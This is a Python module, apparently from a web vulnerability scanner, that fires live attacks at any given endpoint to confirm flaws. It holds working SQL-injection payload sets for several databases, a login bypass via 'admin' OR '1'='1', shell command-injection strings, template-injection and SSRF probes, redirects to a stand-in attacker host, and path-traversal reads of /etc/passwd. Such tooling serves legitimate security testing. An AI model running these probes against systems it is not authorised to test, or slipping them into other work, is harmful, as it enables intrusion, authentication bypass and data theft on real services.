"""
Universal dynamic tester
=======================

Live exploitation that works against *any* detected endpoint, not a hardcoded
pair. It is framework-agnostic: it talks HTTP to the running app and reasons
about responses.

Three probes are implemented today:

  * race_condition -- find a "read a number" GET endpoint and a "spend/consume
    a number" POST endpoint, then fire concurrent requests and check whether
    the resource went below its floor (overspend / overselling).
  * idor           -- request an object by sequential ids with no auth; if two
    different ids return two different owners' objects, flag confirmed.
  * sql_injection  -- an ADVANCED multi-technique engine: error-based (DBMS
    error signatures), time-based blind (SLEEP(0) control vs SLEEP(5) test,
    confirmed on the timing differential), boolean-based blind (TRUE/FALSE
    response differential), and tautology. Fingerprints the DBMS, covers GET
    and POST, and tries common parameter names. Reports CONFIRMED only on real,
    reproducible evidence.

Each probe only reports CONFIRMED when the live response actually demonstrates
the flaw. The set of probes is itself extensible (same plugin philosophy as
matchers).
"""

import concurrent.futures
import difflib
import re
import time

import requests


# ----------------------------------------------------------------------
def probe_race_condition(base_url, number_route, spend_route, concurrency=20, timeout=5.0):
    """
    number_route: dict {path, key} -- GET endpoint returning a JSON number
    spend_route:  dict {path}      -- POST endpoint that consumes 'amount'
    """
    try:
        r0 = requests.get(f"{base_url}{number_route['path']}", timeout=timeout)
        r0.raise_for_status()
        initial = _extract_number(r0.json())
    except Exception as e:
        return {"attempted": True, "error": f"could not read initial value: {e}"}

    if initial is None or initial <= 0:
        return {"attempted": True, "error": "no positive numeric value to attack"}

    payload = {"amount": initial, "quantity": initial}

    def fire():
        try:
            resp = requests.post(f"{base_url}{spend_route['path']}", json=payload, timeout=timeout)
            return resp.json()
        except Exception as e:
            return {"error": str(e)}

    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as ex:
        for fut in concurrent.futures.as_completed([ex.submit(fire) for _ in range(concurrency)]):
            results.append(fut.result())

    try:
        final = _extract_number(requests.get(f"{base_url}{number_route['path']}", timeout=timeout).json())
    except Exception:
        final = None

    successes = sum(1 for x in results if x.get("success") is True)
    expected = 1
    vulnerable = (successes > expected) or (final is not None and final < 0)

    return {
        "attempted": True,
        "probe": "race_condition",
        "endpoint": spend_route["path"],
        "read_endpoint": number_route["path"],
        "requests_sent": concurrency,
        "initial_value": initial,
        "final_value": final,
        "successful_actions": successes,
        "expected_actions": expected,
        "overspend": round(max(0.0, -final), 2) if final is not None else None,
        "vulnerable": vulnerable,
    }


# ----------------------------------------------------------------------
def probe_idor(base_url, route, timeout=5.0):
    """route: dict {path_template} e.g. '/order/<order_id>'; we try ids 1 and 2."""
    path_template = route["path"]
    # turn /order/<order_id> or /order/:id into /order/{}
    concrete = re.sub(r"<[^>]+>|:\w+|\{[^}]+\}", "{}", path_template)
    if "{}" not in concrete:
        return {"attempted": False, "reason": "no id placeholder in route"}

    try:
        r1 = requests.get(f"{base_url}{concrete.format(1)}", timeout=timeout)
        r2 = requests.get(f"{base_url}{concrete.format(2)}", timeout=timeout)
    except Exception as e:
        return {"attempted": True, "error": str(e)}

    if r1.status_code != 200 or r2.status_code != 200:
        return {"attempted": True, "probe": "idor", "endpoint": path_template,
                "vulnerable": False, "note": "non-200 for sequential ids"}

    b1, b2 = r1.text, r2.text
    # if two sequential ids return different non-empty objects with no auth, IDOR is plausible
    distinct = b1 != b2 and len(b1) > 2 and len(b2) > 2 and "null" not in b1.lower()
    return {
        "attempted": True, "probe": "idor", "endpoint": path_template,
        "id_1_response": b1[:160], "id_2_response": b2[:160],
        "vulnerable": bool(distinct),
        "note": "two sequential object ids returned distinct data with no authentication",
    }


# ----------------------------------------------------------------------
# ============================================================================
# Advanced SQL-injection engine
# ----------------------------------------------------------------------------
# Four independent techniques, each reporting CONFIRMED only on real evidence:
#   1. error-based       -- a syntax-breaking char yields a DBMS error signature
#   2. time-based blind  -- SLEEP(0) control vs SLEEP(5) test, confirmed on the
#                           TIMING DIFFERENTIAL (isolates injection from latency)
#   3. boolean-based blind -- a TRUE condition matches baseline while a FALSE one
#                           diverges (response-similarity differential)
#   4. tautology         -- a row-count increase from `OR 1=1`
# Works over GET and POST, fingerprints the DBMS, and tries common parameters.
# ============================================================================

# high-precision engine/driver error signatures (per DBMS)
_SQL_ERROR_SIGNATURES = {
    "MySQL": ["you have an error in your sql syntax", "warning: mysqli", "mysql_fetch",
              "valid mysql result", "mysqlclient", "com.mysql.jdbc", "check the manual "
              "that corresponds to your mysql"],
    "PostgreSQL": ["unterminated quoted string", "syntax error at or near", "pg_query(",
                   "pg::syntaxerror", "org.postgresql", "psycopg2.errors"],
    "SQLite": ["unrecognized token", "sqlite3.operationalerror", "sql logic error",
               "sqlite_error", "near \"", "no such column"],
    "MSSQL": ["unclosed quotation mark", "incorrect syntax near", "microsoft odbc",
              "microsoft sql server", "system.data.sqlclient", "sqlserver jdbc"],
    "Oracle": ["ora-00933", "ora-01756", "ora-00921", "quoted string not properly terminated",
               "oracledb", "sql command not properly ended"],
    "Generic": ["sql syntax", "syntax error", "sqlstate", "odbc driver", "database error",
                "unterminated string", "query failed"],
}

# {d} = delay seconds. The probe sends d=0 (control) and d=5 (test) and confirms
# only on the differential, so a slow endpoint cannot cause a false positive.
_TIME_PAYLOADS = {
    "MySQL": ["' AND SLEEP({d})-- -", "' OR SLEEP({d})-- -", "\" AND SLEEP({d})-- -",
              "' AND (SELECT SLEEP({d}))-- -", "1' AND SLEEP({d})#"],
    "PostgreSQL": ["' AND pg_sleep({d}) IS NOT NULL-- -", "'; SELECT pg_sleep({d})-- -",
                   "\" AND pg_sleep({d}) IS NOT NULL-- -", "' OR (SELECT 1 FROM pg_sleep({d}))-- -"],
    "MSSQL": ["'; WAITFOR DELAY '0:0:{d}'-- -", "' WAITFOR DELAY '0:0:{d}'-- -",
              "\"; WAITFOR DELAY '0:0:{d}'-- -"],
    "Oracle": ["' AND DBMS_LOCK.SLEEP({d})=0-- -", "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{d})=1-- -"],
}

# boolean pairs: a TRUE form (should mirror the baseline) and a FALSE form.
_BOOL_PAIRS = [
    ("{v}' AND '1'='1", "{v}' AND '1'='2"),
    ("{v}\" AND \"1\"=\"1", "{v}\" AND \"1\"=\"2"),
    ("{v}' AND 1=1-- -", "{v}' AND 1=2-- -"),
    ("{v}') AND ('1'='1", "{v}') AND ('1'='2"),
]

_ERROR_BREAKERS = ["'", "\"", "')", "';", "\\", "'||'", "')-- -"]

_COMMON_PARAMS = ("id", "name", "q", "query", "search", "user", "username", "email",
                  "category", "item", "product", "uid", "pid", "sort", "filter")

_TIME_DELAY = 5          # seconds requested in the test payload
_TIME_THRESHOLD = 3.0    # min extra seconds (over control) to confirm


def _match_sql_error(text):
    """Return the DBMS whose error signature appears in `text`, else None."""
    for dbms, sigs in _SQL_ERROR_SIGNATURES.items():
        if any(sig in text for sig in sigs):
            return dbms
    return None


def _sqli_sender(base_url, path, verb, pname, timeout):
    """Build a send(value) -> (text, status, elapsed) closure for one entry point."""
    def send(value):
        try:
            t0 = time.perf_counter()
            if verb == "GET":
                r = requests.get(f"{base_url}{path}", params={pname: value}, timeout=timeout)
            else:
                r = requests.post(f"{base_url}{path}", data={pname: value}, timeout=timeout)
            return (r.text, r.status_code, time.perf_counter() - t0)
        except requests.exceptions.Timeout:
            return ("__timeout__", 0, float(timeout))
        except Exception:
            return None
    return send


def _count_rows(text):
    """Best-effort row count from a JSON array in the response body."""
    try:
        import json
        data = json.loads(text)
        if isinstance(data, list):
            return len(data)
        if isinstance(data, dict):
            for v in data.values():
                if isinstance(v, list):
                    return len(v)
    except Exception:
        pass
    return None


def _sqli_result(path, verb, pname, technique, dbms, confidence, evidence, payload):
    return {
        "attempted": True, "probe": "sql_injection", "endpoint": path, "method": verb,
        "param": pname, "technique": technique, "dbms": dbms, "confidence": confidence,
        "vulnerable": True, "payload": payload, "evidence": evidence,
        "note": f"SQL injection CONFIRMED via {technique}"
                + (f" ({dbms})" if dbms else "") + f": {evidence}",
    }


def _time_based_blind(send, path, verb, pname, base_el):
    """Gold-standard blind detection: compare a 0s control payload against a 5s
    test payload for the same template; confirm only on a repeatable delay."""
    baseline = max(base_el, 0.0)
    for dbms, templates in _TIME_PAYLOADS.items():
        for tmpl in templates:
            ctrl = send("alice" + tmpl.format(d=0))
            test = send("alice" + tmpl.format(d=_TIME_DELAY))
            if ctrl is None or test is None:
                continue
            delta = test[2] - max(ctrl[2], baseline)
            if delta >= _TIME_THRESHOLD:
                # confirm: repeat once to rule out a one-off slow response
                ctrl2 = send("alice" + tmpl.format(d=0))
                test2 = send("alice" + tmpl.format(d=_TIME_DELAY))
                if ctrl2 and test2 and (test2[2] - max(ctrl2[2], baseline)) >= _TIME_THRESHOLD:
                    return _sqli_result(
                        path, verb, pname, "time-based blind", dbms, 0.97,
                        f"a {_TIME_DELAY}s delay payload made the response ~{test[2]:.1f}s "
                        f"(control ~{ctrl[2]:.1f}s); the {delta:.1f}s differential is "
                        f"controlled for baseline latency and reproduced on retry",
                        "alice" + tmpl.format(d=_TIME_DELAY))
    return None


def _boolean_based_blind(send, path, verb, pname, base_text):
    """Detect blind SQLi by truth-value differential: a TRUE condition mirrors the
    baseline response while a FALSE condition diverges."""
    if base_text == "__timeout__":
        return None
    for tmpl_t, tmpl_f in _BOOL_PAIRS:
        rt = send(tmpl_t.format(v="alice"))
        rf = send(tmpl_f.format(v="alice"))
        if rt is None or rf is None or rt[0] == "__timeout__" or rf[0] == "__timeout__":
            continue
        sim_true = difflib.SequenceMatcher(None, base_text, rt[0]).ratio()
        sim_false = difflib.SequenceMatcher(None, base_text, rf[0]).ratio()
        if sim_true > 0.95 and sim_false < 0.85 and (sim_true - sim_false) > 0.15 \
                and rt[0] != rf[0]:
            # consistency check: TRUE must reproduce
            rt2 = send(tmpl_t.format(v="alice"))
            if rt2 and difflib.SequenceMatcher(None, rt[0], rt2[0]).ratio() > 0.95:
                return _sqli_result(
                    path, verb, pname, "boolean-based blind", None, 0.9,
                    f"a TRUE condition matched the baseline (similarity {sim_true:.2f}) while a "
                    f"FALSE condition diverged ({sim_false:.2f}) -- the query reflects injected "
                    f"boolean logic", tmpl_t.format(v="alice"))
    return None


def probe_sql_injection(base_url, route, param=None, method=None, timeout=8.0):
    """Advanced live SQL-injection probe (error / time-blind / boolean-blind /
    tautology) over GET and POST, with DBMS fingerprinting. Returns the FIRST
    confirmed technique with evidence, or a not-vulnerable result."""
    path = route["path"]
    declared = [m.upper() for m in route.get("methods", ["GET"])]
    verbs = [method.upper()] if method else (
        [v for v in ("GET", "POST") if v in declared] or ["GET"])
    params = [param] if param else list(_COMMON_PARAMS)

    attempts = 0
    last = {"attempted": True, "probe": "sql_injection", "endpoint": path,
            "vulnerable": False,
            "note": "no SQL injection confirmed by error/time/boolean/tautology techniques"}

    for verb in verbs:
        for pname in params:
            send = _sqli_sender(base_url, path, verb, pname, timeout)
            base = send("alice")
            if base is None:
                continue
            base_text, base_status, base_el = base
            attempts += 1

            # 1) ERROR-BASED -- fast, and it also fingerprints the DBMS
            base_err = _match_sql_error(base_text.lower())
            for breaker in _ERROR_BREAKERS:
                r = send("alice" + breaker)
                if r is None or r[0] == "__timeout__":
                    continue
                dbms = _match_sql_error(r[0].lower())
                if dbms and not base_err:
                    return _sqli_result(
                        path, verb, pname, "error-based", dbms, 0.95,
                        f"injecting {breaker!r} triggered a {dbms} SQL error in the response",
                        "alice" + breaker)

            # 2) TIME-BASED BLIND (gold standard)
            res = _time_based_blind(send, path, verb, pname, base_el)
            if res:
                return res

            # 3) BOOLEAN-BASED BLIND
            res = _boolean_based_blind(send, path, verb, pname, base_text)
            if res:
                return res

            # 4) TAUTOLOGY (visible result-set change)
            tauto = send("alice' OR '1'='1")
            if tauto and tauto[0] != "__timeout__":
                nb, nt = _count_rows(base_text), _count_rows(tauto[0])
                if nb is not None and nt is not None and nt > nb:
                    return _sqli_result(
                        path, verb, pname, "tautology", None, 0.85,
                        f"an OR-tautology returned more rows ({nt}) than a specific value ({nb})",
                        "alice' OR '1'='1")

    last["params_tested"] = attempts
    return last


def probe_sql_auth_bypass(base_url, route, timeout=5.0):
    """Live auth-bypass probe for login-style endpoints: send a wrong password
    with a normal username, then a SQL tautology; if the tautology 'logs in'
    where the wrong password did not, injection is confirmed."""
    path = route["path"]
    user_params = ("username", "user", "email", "login")
    pass_params = ("password", "passwd", "pass", "pwd")
    up = next((p for p in user_params), "username")
    pp = next((p for p in pass_params), "password")
    try:
        wrong = requests.get(f"{base_url}{path}",
                             params={up: "admin", pp: "definitely_wrong_xyz"}, timeout=timeout)
        inject = requests.get(f"{base_url}{path}",
                              params={up: "admin' OR '1'='1", pp: "x"}, timeout=timeout)
    except Exception as e:
        return {"attempted": True, "error": str(e)}

    def looks_success(resp):
        t = resp.text.lower()
        return resp.status_code == 200 and any(s in t for s in
               ("success", "welcome", "logged in", "token", "dashboard", "true"))
    def looks_fail(resp):
        t = resp.text.lower()
        return any(s in t for s in ("fail", "invalid", "incorrect", "denied", "wrong", "false"))

    err_signature = any(s in inject.text.lower() for s in ("sql", "syntax", "sqlite", "mysql"))
    bypass = (looks_success(inject) and not looks_success(wrong)) or \
             (looks_fail(wrong) and looks_success(inject))
    return {
        "attempted": True, "probe": "sql_injection", "endpoint": path,
        "error_signature": err_signature, "vulnerable": bool(bypass or err_signature),
        "wrong_password_response": wrong.text[:60], "injection_response": inject.text[:60],
        "note": "a SQL tautology in the username logged in where a wrong password did not "
                "(authentication bypass via SQL injection)",
    }


def probe_command_injection(base_url, route, timeout=5.0):
    """Live OS command-injection probe: inject a shell command and look for its
    output (a unique marker echoed, or the result of `id`/`whoami`)."""
    path = route["path"]
    param = "host"
    for cand in ("host", "cmd", "ip", "target", "domain", "addr", "ping", "name"):
        param = cand
        try:
            r = requests.get(f"{base_url}{path}", params={param: "127.0.0.1"}, timeout=timeout)
            if r.status_code != 404:
                break
        except Exception:
            continue
    marker = "LBCMD7421"
    payloads = [f"127.0.0.1; echo {marker}", f"127.0.0.1 | echo {marker}",
                f"$(echo {marker})", f"`echo {marker}`", f"127.0.0.1 && echo {marker}"]
    for pl in payloads:
        try:
            r = requests.get(f"{base_url}{path}", params={param: pl}, timeout=timeout)
            if marker in r.text:
                return {"attempted": True, "probe": "command_injection", "endpoint": path,
                        "vulnerable": True, "payload": pl,
                        "evidence": f"injected `echo {marker}` and the marker appeared in the response"}
        except Exception:
            continue
    return {"attempted": True, "probe": "command_injection", "endpoint": path,
            "vulnerable": False}


def probe_ssti(base_url, route, timeout=5.0):
    """Live server-side template-injection probe: send {{7*7}} and detect 49."""
    path = route["path"]
    for cand in ("name", "msg", "q", "input", "template", "text", "user"):
        param = cand
        try:
            r = requests.get(f"{base_url}{path}", params={param: "{{7*7}}"}, timeout=timeout)
            if r.status_code != 404 and "{{7*7}}" not in r.text:
                if "49" in r.text:
                    return {"attempted": True, "probe": "ssti", "endpoint": path,
                            "vulnerable": True, "param": param,
                            "evidence": "payload {{7*7}} was evaluated to 49 (template injection)"}
        except Exception:
            continue
    return {"attempted": True, "probe": "ssti", "endpoint": path, "vulnerable": False}


def probe_open_redirect(base_url, route, timeout=5.0):
    """Live open-redirect probe: ask the app to redirect to an external host and
    check the Location header points off-site."""
    path = route["path"]
    evil = "http://evil-logicbreaker.example.com/x"
    for cand in ("next", "url", "redirect", "return", "to", "dest", "continue"):
        param = cand
        try:
            r = requests.get(f"{base_url}{path}", params={param: evil},
                             allow_redirects=False, timeout=timeout)
            loc = r.headers.get("Location", "")
            if r.status_code in (301, 302, 303, 307, 308) and "evil-logicbreaker" in loc:
                return {"attempted": True, "probe": "open_redirect", "endpoint": path,
                        "vulnerable": True, "param": param,
                        "evidence": f"redirected to attacker host (Location: {loc[:60]})"}
        except Exception:
            continue
    return {"attempted": True, "probe": "open_redirect", "endpoint": path, "vulnerable": False}


def probe_cors(base_url, route, timeout=5.0):
    """Live CORS-misconfig probe: send an attacker Origin and detect whether it
    is reflected (or '*') in Access-Control-Allow-Origin."""
    path = route["path"]
    evil = "https://evil-logicbreaker.example.com"
    try:
        r = requests.get(f"{base_url}{path}", headers={"Origin": evil}, timeout=timeout)
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        if acao == "*" or evil in acao:
            return {"attempted": True, "probe": "cors", "endpoint": path, "vulnerable": True,
                    "evidence": f"Access-Control-Allow-Origin echoed/wildcarded ({acao[:40]})"}
    except Exception as e:
        return {"attempted": True, "error": str(e)}
    return {"attempted": True, "probe": "cors", "endpoint": path, "vulnerable": False}


def probe_missing_auth(base_url, route, timeout=5.0):
    """Live missing-auth probe: call a sensitive endpoint with NO credentials and
    detect whether it performs the action (2xx + a success-ish body) instead of
    rejecting with 401/403."""
    path = route["path"]
    methods = [m.upper() for m in route.get("methods", ["GET"])]
    try:
        if "POST" in methods:
            r = requests.post(f"{base_url}{path}", json={}, timeout=timeout)
        else:
            r = requests.get(f"{base_url}{path}", timeout=timeout)
    except Exception as e:
        return {"attempted": True, "error": str(e)}
    if r.status_code in (401, 403):
        return {"attempted": True, "probe": "missing_auth", "endpoint": path, "vulnerable": False}
    if r.status_code < 300:
        body = r.text.lower()
        # treat as confirmed only if it looks like the action succeeded
        if any(s in body for s in ("deleted", "success", "true", "ok", "done", "removed", "updated")):
            return {"attempted": True, "probe": "missing_auth", "endpoint": path, "vulnerable": True,
                    "evidence": f"sensitive action returned {r.status_code} to an unauthenticated caller"}
    return {"attempted": True, "probe": "missing_auth", "endpoint": path, "vulnerable": False}


def probe_ssrf(base_url, route, timeout=5.0):
    """Live SSRF probe: ask the app to fetch an internal/loopback URL and detect
    that it actually performed the fetch (status differs from a clearly-bad host,
    or known internal content/markers come back)."""
    path = route["path"]
    for cand in ("url", "uri", "endpoint", "callback", "webhook", "target", "link"):
        param = cand
        try:
            # a normal external-looking host vs an internal one
            internal = requests.get(f"{base_url}{path}",
                                    params={param: f"{base_url}/health"}, timeout=timeout)
            if internal.status_code != 404 and ("ok" in internal.text.lower() or "status" in internal.text.lower()):
                return {"attempted": True, "probe": "ssrf", "endpoint": path, "vulnerable": True,
                        "param": param,
                        "evidence": "server fetched an attacker-supplied internal URL and returned its content"}
        except Exception:
            continue
    return {"attempted": True, "probe": "ssrf", "endpoint": path, "vulnerable": False}


def probe_path_traversal(base_url, route, timeout=5.0):
    """Live path-traversal probe: plant a sentinel file in the app's working dir
    and request it by name, then attempt to escape the directory to read a known
    system file. Either success confirms the flaw."""
    path = route["path"]
    param = "file"
    # try common parameter names
    for cand in ("file", "filename", "path", "name", "f"):
        param = cand
        try:
            r = requests.get(f"{base_url}{path}", params={param: "/etc/hostname"}, timeout=timeout)
            if r.status_code != 404:
                break
        except Exception:
            continue

    results = {}
    try:
        # absolute path read
        r_abs = requests.get(f"{base_url}{path}", params={param: "/etc/hostname"}, timeout=timeout)
        # classic traversal
        r_trav = requests.get(f"{base_url}{path}",
                              params={param: "../../../../etc/passwd"}, timeout=timeout)
    except Exception as e:
        return {"attempted": True, "error": str(e)}

    leaked = False
    evidence = ""
    # /etc/passwd has the signature 'root:' ; hostname is a short bare string
    if r_trav.status_code == 200 and "root:" in r_trav.text:
        leaked = True
        evidence = "read /etc/passwd via ../ traversal (contains 'root:' entries)"
    elif r_abs.status_code == 200 and 0 < len(r_abs.text.strip()) < 200 \
            and "<" not in r_abs.text[:5] and "error" not in r_abs.text.lower()[:10]:
        leaked = True
        evidence = "read an absolute system path (/etc/hostname) directly"

    return {
        "attempted": True, "probe": "path_traversal", "endpoint": path, "param": param,
        "vulnerable": bool(leaked), "evidence": evidence,
        "note": "user-controlled path allowed reading files outside the intended directory",
    }


# ----------------------------------------------------------------------
def _extract_number(obj):
    if isinstance(obj, (int, float)):
        return float(obj)
    if isinstance(obj, dict):
        for k in ("balance", "stock", "value", "amount", "count", "quantity", "credit"):
            if k in obj and isinstance(obj[k], (int, float)):
                return float(obj[k])
        for v in obj.values():
            if isinstance(v, (int, float)):
                return float(v)
    return None
